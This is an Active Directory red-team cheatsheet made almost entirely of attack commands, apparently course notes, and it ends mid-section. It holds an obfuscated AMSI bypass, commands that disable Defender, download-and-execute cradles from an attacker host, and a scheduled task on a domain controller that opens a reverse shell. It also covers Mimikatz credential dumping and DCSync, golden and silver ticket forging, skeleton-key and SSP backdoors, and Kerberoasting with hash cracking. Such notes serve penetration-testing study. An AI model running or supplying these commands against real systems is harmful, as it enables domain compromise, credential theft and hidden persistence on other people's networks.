# AD Hacking cheatsheet - Red Team

---

# AV Evasion

**Disable MS Defender**

- Bypass the execution policy
    
    ```powershell
    powershell -ep Bypass
    ```
    
- Disable AV using powershell (Requires Local Admin rights)
    
    ```powershell
    Get-MPPreference
    Set-MPPreference -DisableRealTimeMonitoring $true
    Set-MPPreference -DisableIOAVProtection $true
    Set-MPPreference -DisableIntrusionPreventionSystem $true
    ```
    
- Bypass AMSI Check (If Admin rights are not available)
    
    ```powershell
    S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
    ```
    
- Download and save the file on disk
    
    ```powershell
    iwr <http://192.168.100.XX/rubeus.exe> -outfile rubeus.exe
    
    ```
    
- Download and execute cradle (Files can be hosted using HFS.exe or Python Webserver)
    
    ```powershell
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/PowerView.ps1>')
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/Invoke-Mimikatz.ps1>')
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/mimilib.dll>')
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/Set-RemotePSRemoting.ps1>')
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/Set-RemoteWMI.ps1>')
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/MS-RPRN.exe>')
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/Rubeus.exe>')
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/Add-RemoteRegBackdoor.ps1>')
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/Find-PSRemotingLocalAdminAccess.ps1>')
    iex (New-Object Net.WebClient).DownloadString('<http://192.168.100.XX/Find-WMILocalAdminAccess.ps1>')
    
    ```
    

# Enumeration

**Domain Enumeration**

- Get Basic Information about Domain
    
    ```powershell
    
    
	# Users
	Get-NetUser

	# computers
	Get-NetComputer

	# domain admin Get current domain

	Get-NetDomain

	# See Attributes of the Domain Admins Group
	Get-NetGroup -GroupName "Domain Admins" -FullData

	# Get Members of the Domain Admins group
	Get-NetGroupMember -GroupName "Domain Admins"

	# Forest
	## Get a list of all domain trusts for the current domain

	Get-NetDomainTrust
	Get-NetForestDomain | Get-NetDomainTrust

	# If bidirectional
	Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust

	#Kerberoastable users
	## Find user accounts used as Service account

	Get-NetUser -SPN 
	Get-NetUser -SPN -Verbose | select displayname,memberof
	
	# Request TGS
	
	Add-Type -AssemblyName System.IdentityModel
	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/computer.domain.local"
	
	
	
	# Bloodhound
	. .\SharpHound.ps1
	Invoke-BloodHound -CollectionMethod All,LoggedOn

	# SQL
	Import-Module .\PowerUpSQL.psd1
	Get-SQLInstanceDomain
	
	#Get object of another domain

	Get-NetDomain –Domain cyberwarfare.corp
    Get-NetComputer – FullData
    Get-NetComputer –OperatingSystem "Windows Server 2016 Standard"
	
    ```
    
- FindGet-NetGroup
    
    ```powershell
	
	# Get all the groups in the current domain

	Get-NetGroup
	Get-NetGroup -Domain <targetdomain>
	Get-NetGroup -FullData
	Get-NetComputer -Domain
	
    Get-NetGroup –Domain cyberwarfare.corp the SID of the current Domain
	
    # Get domain controllers for another domain

    Get-NetDomainController –Domain cyberwarfare.corp
    
	# Get domain SID for the current domain

    Get-DomainSID
    ```
    
- Find the policy applicable to current domain
    
    ```powershell
	# Get domain policy for the current domain

    Get-DomainPolicy
	
    (Get-DomainPolicy)."Kerberos Policy"
	
	(Get-DomainPolicy)."system access"

    
    ```
	
- Get domain policy for another domain


```powershell

(Get-DomainPolicy -domain moneycorp.local)."system access"
(Get-DomainPolicy -domain moneycorp.local)."kerberos policy"
(Get-DomainPolicy -domain moneycorp.local)."Privilege Rights"

# OR

(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges
#Keep note of the kerberos policy as it will be required while making Golden Tickets with mimikats with the same offsets else it will get blocked by the defenders

```

  
- Find the DC Servers in current Domain
    
    ```powershell
	# Get domain controllers for the current domain

    Get-NetDomainController
    Get-NetDomainController -Forest OrganicSecurity.local
    
    ```
    
- Enumerate Domain OU
    
    ```powershell
	# Get OUs in a domain

    Get-NetOU -FullData
    
    ```
    

**User, Group & Computer Object**

- Enumerate the Information about the Domain Users
    
    ```powershell
    Get-NetDomainUser
    
    ```
    
- Search the user attributes for specific terms
    
    ```powershell
	
	# Search for a particular string in a user's attributes

    Find-UserField -SearchField Description -SearchTerm "Password"
    
    ```

- Get the group membership for a user

    ```powershell

    Get-NetGroup -UserName "student1"

    ```

    
- Find all the groups on the Current Domain
    
    ```powershell
    Get-NetGroup
    Get-NetGroup -Recurse
    
    Get-NetGroupMember –GroupName “Domain Admins” -verbose
	
	# List all the local groups on a machine (needs administrator privs on non-dc machines)

    Get-NetLocalGroup –ComputerName DC-01 -ListGroups
	Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
	
	# Get members of all the local groups on a machine (needs administrator privs on non-dc machines)

	Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse

	# Get all groups containing the word "admin" in group name

	Get-NetGroup *admin*
	Get-NetGroup -GroupName *admin*
	Get-NetGroup *admin* -FullData
	Get-NetGroup -GroupName *admin* -Doamin moneycorp.local
    ## Groups like "Enterprise Admins","Enterprise Key Admins",etc will not be displayed in the above commands unless the domain is not specified because it is only available on the domain controllers of the forest root


    ```
	
- Get all the members of the Domain Admins group

    ```powershell

    Get-NetGroupMember -GroupName "Domain Admins" -Recurse

    #test the below command
    #Get-NetGroupMember -GroupName "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members
    ## Make sure to check the RID which is the last few charachters of the SID of the member-user as the name of the member-user might be different/changed but the RID is unique. For example : It might be an Administrator account having a differnt/changed member-name but if you check the RID and it is "500" then it is an Administrator account
    ```





- Find Group Membership
    
    ```powershell
    Get-NetGroupMember -GroupName "EnterPrise Admins" -Domain "OrganicSecurity.local"
    
    ```
    
- Find local group created on the servers (requires admin rights for checking on non-dc machines)
    
    ```powershell
    Get-NetLocalGroup -Computername <dc>
    
    ```
    
- Get the list of Computer Objects
    
    ```powershell
	# Get a list of computers in the current domain

    Get-NetComputer
    Get-NetComputer -OperatingSystem "*Server 2016*"
	Get-NetComputer -Ping
	Get-NetComputer -FullData
	
	# Any computer administrator can create a computer object in the domain which is not an actual computer/Virtual-Machine but its object type is a computer


    ```
    

**Shares & Juicy Files**

- Identify the shares in current domain
    
    ```powershell
    Invoke-ShareFinder
    
    ```
    
- Identify juicy files accessible over the shared folder
    
    ```powershell
    Invoke-FileFinder
    
    ```
    
- Find File servers in current domain
    
    ```powershell
    Get-FileNetServer
    
    ```
    
- Find hardcoded Password via Group Policy Preference
    
    ```powershell
    findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
    
    ```
    
- Decrypt the GPP Password identified in previous step ([https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1))
    
    ```powershell
    Get-DecryptedCpassword
    
    ```
    

**User Hunting**

- Find session of logged on users on the server
    
    ```powershell
    Get-NetLoggedOn <computer-name>
    (Get-NetComputer -FullData).foreach({Get-NetLoggedOn $_.cn})
	
	# Get actively logged users on a computer (needs local admin rights on the target)
	Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local 

    
    ```

- Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)

	```powershell
	Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local 

	```

- Find last logged on user on the remote machine
    
    ```powershell
	#Get the last logged user on a computer (needs administrative rights and remote registry on the target)

    Get-LastLoggedOn -ComputerName <servername>
    
    ```
    
- Find all the local admin accounts on all the machines (Required Admin rights on non-dc machines)
    
    ```powershell
    Invoke-EnumerateLocalAdmin | select ComputerName, AccountName, IsDomain, IsAdmin
    
    ```
    
- Find Local Admin rights for current user
    
    ```powershell
    Find-LocalAdminAccess
    Invoke-CheckLocalAdminAccess
    Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>
    
    ```
    
- Find the computers where Domain Admin or specified User/Group has active session
    
    ```powershell
    Invoke-UserHunter
    
    ```
    
- "stealth" option only checks for session on only High Value Servers
    
    ```powershell
    Invoke-UserHunter -stealth
    
    ```
    
- Check for Powershell Remoting access for current user
    
    ```powershell
    Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>
    
    ```
    
- Check for Remote Access via WMI for current user
    
    ```powershell
    Find-WMILocalAdminAccess -ComputerName <server_fqdn>
    
    ```
    

**GPO Enumeration**

- Find all the GPO configured in a given domain
    
    ```powershell
	# Get list of GPO in current domain.

	Get-NetGPO
	Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local
	Get-GPO -All (GroupPolicy module)
	Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html (Provides RSoP)
	gpresult /R /V (GroupPolicy Results of current machine)
	
    Get-NetGPO | select displayname
    Get-NetGPO -ComputerName <server_fqdn>
    
    ```

- Get GPO(s) which use Restricted Groups or groups.xml for interesting users

	```powershell
	
	Get-NetGPOGroup 

	```

- Get users which are in a local group of a machine using GPO
	
	```powershell
	
	Find-GPOComputerAdmin -ComputerName student1.dollarcorp.moneycorp.local

	
	```

    
- Find the GPOs applied on a specific OU in the domain
    
    ```powershell
    Get-NetOU -FullData | select ou,pglink
	
    Get-NetGPO -GPOName "{GPO_ID}"
	
	# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights

	Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

	
	#Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU

	Get-NetGPO -GPOname "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"
	Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081 (GroupPolicy module) 
    
    ```
    
- Find If there is GPO configured which is using Restricted Groups via groups.xml to assign local admin membership
    
    ```powershell
    Get-NetGPOGroup
    
    ```
    
- Find machines where the given user is member of a specific group
    
    ```powershell
	# Get machines where the given user is member of a specific group

	Find-GPOLocation -Username student1 -Verbose
	
    Get-GPOLocation -UserName <username>
    
    ```
    

**Access Control Model (ACL)**

- Fetch all the ACL associated with a given user account
    
    ```powershell
    Get-ObjectAcl -SamAccountName <username> | select AccessControlType, IdentityReference, ActiveDirectoryRights
	
	# Get the ACLs associated with the specified object (groups)

	Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs

	
    # ACL enumeration, obtain the ACL associated with the entity:
    Get-ObjectAcl -SamAccountName <Domain_User> –ResolveGUIDs
    ```
    
- Fetch all the ACL by ADSPath for any AD Object
    
    ```powershell
    Get-ObjectAcl -ADSPath "LDAP://CN={73267-86872-368732},CN=Policies,CN=System,DC=organicsecurity,DC=local"
	
	# Get the ACLs associated with the specified LDAP path to be used for search

	Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
    
    ```
    
- Fetch all the ACL by ADSPrefix
    
    ```powershell
	
    Get-ObjectAcl -ADSPrefix "CN=Administrator,CN=Users"
    
	# Get the ACLs associated with the specified prefix to be used for search
	
	Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose

	
    ```
    
- Enumerate ACLs using ActiveDirectory module but without resolving GUIDs
	
	```powershell
	
	(Get-Acl "AD:\CN=Administrator, CN=Users, DC=dollarcorp, DC=moneycorp,DC=local").Access

	```
	
- Use below command to find all the interesting ACEs
    
    ```powershell
    Invoke-ACLScanner | select AccessControlType, IdentityReference, ActiveDirectoryRights, ObjectDN

    #Unique and interesting ACL Scanning, Search for interesting ACEs

    Invoke-ACLScanner –ResolveGUIDs
    ```
    
- Identify the ACL associated with the specified path
    
    ```powershell
    GetPathAcl -Path "\\dc.organicsecurity.local\sysvol"
    
    ```
    

**Forest & Domain Trusts**

- Enumerate Trust of current domain
    
    ```powershell
	#Get a list of all domain trusts for the current domain

    Get-NetDomainTrust
    
    Get-NetDomainTrust –Domain cyberwarfare.corp
    ```
    
- Enumerate Current Forest, and its domain
    
    ```powershell
	# Get details about the current forest

    Get-NetForest
    Get-NetForest -Forest organicsecurity.local
    
    ```
    
- Enumerate all the domains under given forest
    
    ```powershell
	# Get all domains in the current forest

    Get-NetForestDomain
    Get-NetForestDomain -Forest eurocorp.local

    Get-NetForestDomain –Verbose
    Get-NetForest -Verbose
    ```
    
- Find the Global Catalouge for given forest
    
    ```powershell
	#Get all global catalogs for the current forest

    Get-NetForestCatalog
	Get-NetForestCatalog -Forest eurocorp.local
    
    ```
    
- Find the forest trust
    
    ```powershell
	
	# Map trusts of a forest

	Get-NetForestTrust

    Get-NetForestTrust -Forest organicsecurity.local
    
    ```
    

**BloodHound & SharpHound**

- Install neo4j service
    
    ```powershell
    .\neo4j.bat install-service
    net start neo4j
    
    . .\Sharhound.ps1
    Invoke-BloodHound -CollectionMethod All
    
    ```
    

# PrivEsc - Misconfiguration & Feature Abuse

- Escalate privilege on local system to gain Admin rights
    - PowerUp : https://[github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](http://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
    - BeRoot : https://[github.com/AlessandroZ/BeRoot](http://github.com/AlessandroZ/BeRoot)
    - Privesc : https://[github.com/enjoiz/Privesc](http://github.com/enjoiz/Privesc)
- **PowerUp**
    + NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR
	
    ```powershell
    Get-ServiceUnquoted
	# Unquoted service path:
	Get-ServiceUnquoted -Verbose
	
    Invoke-AllChecks
    
    Invoke-ServiceAbuse -Name 'Sevice Name'
	
	# Abusing services
	Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student21'

	# Run mimikatz
	Invoke-Mimikatz
    
    #PowerUP can be used for native upgrades in Windows environments
    . .\PowerUP.ps1
    Invoke-AllChecks –Verbose
    ```
    
- **Jenkins**
    
    ```powershell
    .\nc64.exe -l -p 443
    
    schtasks /create /S dc.organicsecurity.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Job01" /TR "powershell.exe -c 'iex ( iwr <http://192.168.100.XX/dakiya.ps1>  -UseBasicParsing); Dakiya -Reverse -IPAddress 192.168.100.YY -Port 443'"
    
    schtasks /Run /S dc.organicsecurity.local /TN "Job01"
    
    schtasks /Query /S dc.organicsecurity.local
    
    ```
    

# Lateral Movement & Persistance

- Execute command using powershell remoting
    
    ```powershell
    $sess = New-PSSession -ComputerName <computer/list_of_servers>
    Enter-PSSession -$sess
    
	# Connect to a PS-Session of a remote user

    Enter-PSSession -ComputerName <server_name>
	Enter-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
	
	# Now we can access any machine with valid username and password as mimikatz

	Enter-PSSession -Computername dcorp-dc.dollarcorp.moneycorp.local -credential dcorp\Administrator

    
    Invoke-Command -Scriptblock {Get-Process} -ComputerName <computer>
    Invoke-Command -Scriptblock ${function:Get-Process} -ComputerName <computer>
    Invoke-Command -FilePath <script.ps1> -ComputerName <Get-Content computers.txt>
	
	# Execute Stateful commands using Invoke-Command ( persistence )
	$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
	Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
	Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
    
	
	# Directly load function on the remote machines using FilePath

	$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
	Invoke-Command -FilePath "C:\temp\hello.ps1" -Session $sess
	Enter-PSSession -Session $sess

	[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> hello
	Hello from the function
    ```
    

**Mimikatz Cheatsheet**

- Default Command
    
    ```powershell
    Invoke-Mimikatz
    Invoke-Mimikatz -DumpCreds # Dump credentials on a local machine

	#Dump credentials on multiple remote machines

    Invoke-Mimikatz -DumpCreds -ComputerName <comp>
	Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")

    
    ```
    
- Use Mimikatz with PowerShell Remoting
    
    ```powershell
    Invoke-Command -FilePath invoke-mimikatz.ps1 -Session $sess
    
    ```
    
- Dump credentials from memory (lsass.exe)
    
    ```powershell
    Invoke-Mimimatz -Command '"sekurlsa::logonpasswords"'
    Invoke-Mimimatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
    
    ```
    
- Dump credentials from local SAM account (Contains DSRM Admin creds) & LSA (conatins details from ntds.dat)
    
    ```powershell
    Invoke-Mimimatz -Command '"lsadump::sam"'

	# Execute mimikatz on DC as DA to get krbtgt hash
	
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
	
    
    ```
    
- Dump credentials from windows vault
    
    ```powershell
      Invoke-Mimimatz -Command '"token::elevate" "vault::list"'
      Invoke-Mimimatz -Command '"token::elevate" "vault::cred /patch"'
    
    ```
    
- Perform DCSync Attacks (Requires DA Rights) [Mention user in domain\user format only ]
    
    ```powershell
    Invoke-Mimimatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local"'
    
    ```
    
- Perform PassTheHash (PTH) Attacks (Requires Elevated Shell Access; "RunAs Administrator")
    
    ```powershell
    Invoke-Mimimatz -Command '"sekurlsa::pth /user:Administrator /domain:organicsecurity.local /ntlm:c10c9ac42937a938c0ca8faf0af0af02 /run:powershell.exe"'
    
    ```
    
- Use the KRBTGT Hash to craft Golden Ticket (TGT)
    
    ```powershell
	
	# Extract krbtgt account hash
	
	Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"'
	
    # Domain SID :
	whoami /all (of a domain user)
	
	# Adversary Forge Golden ticket in a Domain 
	##Create a ticket on any machine [ "pass the ticket" attack]

	Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-xxxxx-yyyyy-xxxxx /krbtgt:xxxxxxxxxxxxxxxxxx /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
	
	## Using hash of the Domain Controller computer account, below command provides access to shares on the DC

	Invoke-Mimikatz -Command '"kerberos::golden /domain:ad.domain.local /sid:<sid> /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:<rc4-hash> /user:Administrator /ptt"'
	
    Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-181111131-32111163-5111111 /krbtgt:c10c9ac42937a938c0ca8faf0af0af02 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden_tkt.kirbi"'
    
    Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-181111131-32111163-5111111 /krbtgt:c10c9ac42937a938c0ca8faf0af0af02 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
	
	Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:a9b30e5bO0dc865eadcea941le4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

    
    ```
    
- Import the golden ticket into the memory
    
    ```powershell
    Invoke-Mimikatz -Command '"kerberos::ptt golden_tkt.kirbi"'
    
    ```
    
- Crafting Silver Ticket (TGS) for CIFS Service (Requires service account creds/ machine account)
    
    ```powershell
    Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:organicsecurity.local /sid:S-1-5-21-182222111-321222112-53222211 /rc4:ff46a932423423427602342346f35 /target:dc.organicsecurity.local /service:CIFS/dc.organicsecurity.local /ptt"'
    
    ls \\organicsecurity.local\c$
    NOTE: HOST - Scheduled Task | HOST + RPCSS - PowerShell remoting & WMI | LDAP - DCSync
    
    ```
    
- Perform Skeleton Key based persistance attack (Use Mimikatz as default password for all account)
    
    ```powershell
    Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc
    
    ```
    
- Backdoor SSP on DC to log credentials in cleartext in log file (c:\windows\system32\kiwissp.log)
    
    ```powershell
    $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
    
    $packages +="mimilib"
    
    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $packages
    
      OR
    
    Invoke-Mimikatz -Command '"misc::memssp"'
    
    ```
    

**Read Protected file from the disk**

- Read NTDS.dit file (Only on DC, Containes the credentials of the AD Users)
    
    ```powershell
    Invoke-NinjaCopy C:\Windows\System32\ntds.dit C:\ntds.dit
    
    ```
    

**Read Protected file from the disk**

- Identify the Applocker Policy to bypass the contrained jail shell
    
    ```powershell
    Get-AppLockerPolicy -Effective  | select -ExpandProperty RuleCollections
    
    ```
    

**AdminSDHolder**

- Get the ACLs defines on the AdminSDHolder object
    
    ```powershell
    Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" -ResolveGUIDs | select AccessControlType, IdentityReference, ActiveDirectoryRights
    
    ```
    
- Assign GenericAll rights to current (User01) account on AdminSDHolder container
    
    ```powershell
    Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=system" -PrincipalSamAccountName User01 -Rights All -verbose
    
    ```
    
- Assign ResetPassword rights to (User01) account on AdminSDHolder container
    
    ```powershell
    Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System" -PrincipalSamAccountName student379  -Rights ResetPassword -verbose
    
    Set-DomainUserPassword -Identity testuser -AccountPassword (ConvertTo-SecureString "Pass@123" -AsPlainText -Force) -Verbose
    
    ```
    
- Check if "User01" has any ACL set on "Domain Admins" group
    
    ```powershell
    Get-ObjectAcl -SamAccountName "Domain Admins"  | ?{$_.IdentityReference -like "*User01*"}
    
    ```
    
- Assign DCSync right to "User01" on the current domain
    
    ```powershell
    Add-ObjectAcl -TargetADSpath "DC=dollarcorp,DC=moneycorp,DC=local" -PrincipalSamAccountName User01 -Rights DCSync -Verbose
    
    ```
    
- Assign Full rights to the root domain
    
    ```powershell
    Add-ObjectAcl -TargetADSpath "DC=dollarcorp,DC=moneycorp,DC=local" -PrincipalSamAccountName User01 -Rights ALL -Verbose
    
    ```
    

**ACL - Security Descriptors & Remote Registry**

- Add remote registery backdoor to access the DC without admin rights
    
    ```powershell
    Add-RemoteRegBackdoor -ComputerName dcorp-dc -user orangesecurity\user01
    Get-RemoteMachineAccountHash -Computer dcorp-dc -verbose
    Get-RemoteLocalAccountHash -Computer dcorp-dc -verbose
    Get-RemoteCachedCredential -Computer dcorp-dc -verbose
    
    ```
    

# Domain Privilege Escalation

**Kerberosting**

- Identify the user/service accounts vulnerable to kerberosting attack
    
    ```powershell
    Get-NetUser -spn | select cn, samaccountname, serviceprincipalname
    
    ```
    
- Method 1: Fetch TGS of the vulnerable account (SPN name should match extactly as in the user attribute)
    
    ```powershell
    .\Rubeus.exe kerberoast /spn:"MSSQLSvc/sqlserver.organicsecurity.local:1433" /user:dcorp\sqladmin /domain:organicsecurity.local /dc:dc.organicsecurity.local  format:hashcat /outfile:mssqlsvc_tgs.hash
    
    Get-DomainSPNTicket -SPN "MSSQLSvc/dcorp-mgmt.organicsecurity.local" -OutputFormat Hashcat
    
    ```
    
- Crack the kerberost hash using Hashcat utility
    
    ```powershell
    hashcat.exe -a 0 -m 13100 sql_kerb.txt 500-worst-passwords.txt
    
    ```
    
- Method 2: Extract TGS from memory and crack it using tgsrepcrack
    
    ```powershell
	# Find the user account used as a service account:
	Get-NetUser –SPN
	
	# We request the TGS aka service ticket :
	Request-SPNTicket
	
    Get-NetUser -SPN | Request-SPNTicket
	
	# Check the tickets in memory
	## List Kerberos services available

    klist
	
	# Export ticket using Mimikatz 
	## Copy the file name of the ticket you exported; In this case its the file path for MSSQLSvc

    Invoke-Mimikatz -Command '"kerberos::list /export"'
	
	#Crack service account password using tgsrepcrack.py
    .\tgsrepcrack.py .\10k-worst-pass.txt .\tickets\7-40a10000-sqluser@MSSQLSvc~sqlserver.dc.organicsecurity.local.kirbi
    
	# Request-SPNTicket with PowerView can be used for cracking with JTR

	python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-user1@MSSQLSvc~computer.domain.localDOMAIN.LOCAL.kirbi

    ```
    

**Targetted Kerberosting**

- Find the account having write privileges for current user
    
    ```powershell
    Invoke-ACLScanner  -ResolveGUID | ?{$_.IdentityReferencename -like "*user01"}
    Invoke-ACLScanner  -ResolveGUID | ?{$_.IdentityReferencename -like "rdpusers"}
    
    ```
    
- Perform targetted SPN, where the current user has GenericAll or Write Property privilege
    
    ```powershell
    Set-DomainObject -Identity testuser01 -Set @{serviceprincipalname='ops/test'}
    
    ```
    

**ASREP-Roasting**

- Enumerate user account where Kerberos Preauth is disabled
    
    ```powershell
    Get-DomainUser -PreauthNotRequired -Verbose
    
    ```
    
- Method 1: Fetch the AS-REP Response using Rubeus
    
    ```powershell
    .\Rubeus.exe asreproast
    .\Rubeus.exe asreproast /format:hashcat /user:user01 /outfile:hash.txt
    .\Rubeus.exe asreproast /format:hashcat /outfile:hash.txt
    
    ```
    
- Method 2: Use ASREPRoast Powershell script
    
    ```powershell
    . .\ASREPRoast.ps1
    Get-ASREPHash -UserName vpn379user
    
    ```
    
- Crack the hash using Hashcat
    
    ```powershell
    hashcat.exe -a 0 -m 18200 asrep-roast.txt 500-worst-passwords.txt
    
    ```
    

**Targeted ASREP-Roasting**

- Determine if the current user has permission to set User Account Control flag for another user
    
    ```powershell
    Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -like 'S-1-5-21-37422221-831111-1111111-1*'}
    Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'User01'}
    
    ```
    
- Set the UserAccountControl bit to disable kerberos preauth for given account
    
    ```powershell
    Set-DomainObject -Identity User01 -XOR @{useraccountcontrol=4194304}
    
    ```
    

# Delegation

**Unconstrained Delegation**

1. For an example we have machine pwn1 as an Unconstrained user; We are pwn0 and we got foot-hold/credentials/hashes for machine pwn2 who has local admin access for machine pwn1; Hence we can perform this attack
2. Get a Powershell session as a different user using "Over pass the hash" attack if required(in this case its pwn2/appadmin)
3. We can try searching for local admins it has access to using Find-LocalAdminAccess -Verbose
4. Create a New-PSSession attaching to the "Unconstrained user"
5. Enter the new session using Enter-PSSession
6. Bypass the AMSI
7. EXIT
8. Load Mimikatz.ps1 on the new session using Invoke-command
9. Enter the new session using Enter-PSSession again
10. Now we can get the admin token and save it to the disk
11. Try and check if you have any file from a DA
12. If not we can try to pull if there is any sessions logged on as Administrator as pwn0 using Invoke-Hunter then run the attack again
13. Once we get an DA token we can Reuse the token using Invoke-Mimikatz
14. Now we can access any service on the DC; Example ls \\dc-corp\C$ or use WMI-Commands / ScriptBlock



- Identify Computer Objects where Unconstrained Delegation is allowed
    
    ```powershell
	
	# Enumerate computers with Unconstrained Delegation

	Get-NetComputer -UnConstrained

	
    Get-NetComputer -Unconstrained | select cn
	
	# List computers with Unconstrained Delegation Enabled:
	Get-NetComputer –unconstrained -verbose
	
	# Extract the Domain Admin TGT
		
	# Check if a token is available and save to disk
	## Get admin token After compromising the computer with UD enabled, we can trick or wait for an admin connection

	Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

	
	# Reuse the ticket to perform other operations as Domain Admin:
	Invoke-Mimikatz –Command '"kerberos::ptt ticket.kirbi"'
	
	## Reuse of the DA token
	
	Invoke-Mimikatz -Command '"kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi"'

	# Pull any sessions if logged on with administrator/ Printer Bug

	Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose

	
	# Run DCSYNC Attack 
	## To use the DCSync feature for getting krbtg hash execute the below command with DA privileges

	Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"'
	Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

	
	## Extract krbtgt account hash
	
	Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\dc-01$"'
	
	## Domain SID 
	
	whoami /all (of a domain user)
	
	## Adversary Forge Golden ticket in a Domain as follows 
	
